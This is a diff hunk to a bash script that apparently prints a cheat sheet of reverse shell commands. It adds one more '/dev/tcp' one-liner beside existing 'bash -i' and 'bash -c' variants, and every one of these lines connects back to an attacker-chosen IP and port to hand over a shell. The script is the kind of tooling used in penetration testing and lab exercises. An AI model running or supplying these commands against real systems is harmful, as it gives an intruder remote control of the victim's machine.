@@ -22,6 +22,7 @@ echo -e ""
 
 
 echo -e "${Frame}###${End} ${Title}Bash${End} ${Frame}###${End}"
+echo -e "${Point} bash >& /dev/tcp/$ip/$port 0>&1"
 echo -e "${Point} bash -i >& /dev/tcp/$ip/$port 0>&1"
 echo -e "${Point} bash -c \"bash -i >& /dev/tcp/$ip/$port 0>&1\" ${Comment}# wrapped${End}"
 echo -e ""
